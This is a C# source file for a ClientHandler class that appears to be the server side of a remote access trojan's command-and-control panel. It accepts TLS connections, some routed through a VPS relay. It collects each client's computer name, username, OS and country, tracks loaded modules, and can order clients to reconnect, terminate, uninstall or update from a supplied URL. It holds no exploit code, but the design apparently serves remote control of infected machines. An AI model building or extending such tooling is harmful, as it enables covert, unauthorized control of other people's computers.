using System.Net.Security;
using System.Net.Sockets;
using System.Text.Json;
using mullvad.Models;
using mullvad.Protocol;

namespace mullvad.Network
{
    public sealed class ClientHandler
    {
        private readonly TcpClient? _tcp;
        private readonly Stream     _stream;

        public ClientInfo      Info          { get; } = new();
        public HashSet<string> LoadedModules { get; } = new(StringComparer.OrdinalIgnoreCase);

        private readonly SemaphoreSlim _writeLock = new SemaphoreSlim(1, 1);
        private volatile bool _disconnected = false;

        public event Action<ClientHandler>?         Disconnected;
        public event Action<ClientHandler, Packet>? PacketReceived;
        public event Action<ClientHandler>?         HandshakeReceived;

        // Real TCP+TLS connection
        public ClientHandler(TcpClient tcp, SslStream ssl)
        {
            _tcp    = tcp;
            _stream = ssl;

            if (tcp.Client.RemoteEndPoint is System.Net.IPEndPoint ep)
            {
                Info.IpAddress = ep.Address.ToString();
                Info.Port      = ep.Port;
            }
        }

        // Virtual connection backed by an in-memory pipe (VPS relay)
        internal ClientHandler(Stream stream, string ipAddress, int port = 0)
        {
            _tcp           = null;
            _stream        = stream;
            Info.IpAddress = ipAddress;
            Info.Port      = port;
        }

        public async Task RunAsync(CancellationToken ct)
        {
            try
            {
                while (!ct.IsCancellationRequested && (_tcp == null || _tcp.Connected))
                {
                    var packet = await Packet.ReadAsync(_stream, ct);
                    if (packet is null) break;

                    switch (packet.Type)
                    {
                        case PacketType.Handshake:
                            ApplyHandshake(packet.Json);
                            HandshakeReceived?.Invoke(this);
                            break;
                        case PacketType.Ping:
                            await SendAsync(Packet.Create(PacketType.Pong));
                            break;
                    }

                    PacketReceived?.Invoke(this, packet);
                }
            }
            catch (OperationCanceledException) { }
            catch { }
            finally
            {
                _disconnected    = true;
                Info.IsConnected = false;
                try { _stream.Dispose(); } catch { }
                try { _tcp?.Close(); }     catch { }
                Disconnected?.Invoke(this);
            }
        }

        public async Task SendAsync(Packet packet)
        {
            if (_disconnected) return;
            // 30-second write timeout guards against stalled TCP windows on dead peers
            if (!await _writeLock.WaitAsync(TimeSpan.FromSeconds(30)))
            {
                Disconnect();
                return;
            }
            try
            {
                using var writeCts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
                await _stream.WriteAsync(packet.Serialize(), writeCts.Token);
            }
            catch
            {
                _disconnected = true;
                // Close the socket so RunAsync detects the disconnect immediately
                try { _tcp?.Close(); }     catch { }
                try { _stream.Dispose(); } catch { }
            }
            finally { _writeLock.Release(); }
        }

        public void Disconnect()
        {
            _disconnected = true;
            try { _tcp?.Close(); }    catch { }
            try { _stream.Dispose(); } catch { }
        }

        public Task ReconnectAsync()        => SendAsync(Packet.Create(PacketType.ClientReconnect));
        public Task TerminateAsync()        => SendAsync(Packet.Create(PacketType.ClientTerminate));
        public Task UninstallAsync()        => SendAsync(Packet.Create(PacketType.ClientUninstall));
        public Task UpdateAsync(string url) => SendAsync(Packet.Create(PacketType.ClientUpdate, new { url }));

        private void ApplyHandshake(string json)
        {
            try
            {
                var doc = JsonDocument.Parse(json).RootElement;
                if (doc.TryGetProperty("computer",     out var c))  Info.Computer     = c.GetString() ?? Info.Computer;
                if (doc.TryGetProperty("username",     out var u))  Info.Username     = u.GetString() ?? Info.Username;
                if (doc.TryGetProperty("os",           out var o))  Info.Os           = o.GetString() ?? Info.Os;
                if (doc.TryGetProperty("os_edition",   out var oe)) Info.OsEdition    = oe.GetString() ?? Info.OsEdition;
                if (doc.TryGetProperty("architecture", out var a))  Info.Architecture = a.GetString() ?? Info.Architecture;
                if (doc.TryGetProperty("country",      out var cc)) Info.Country      = cc.GetString() ?? Info.Country;
                if (doc.TryGetProperty("version",      out var v))  Info.Version      = v.GetString() ?? Info.Version;
            }
            catch { }
        }
    }
}
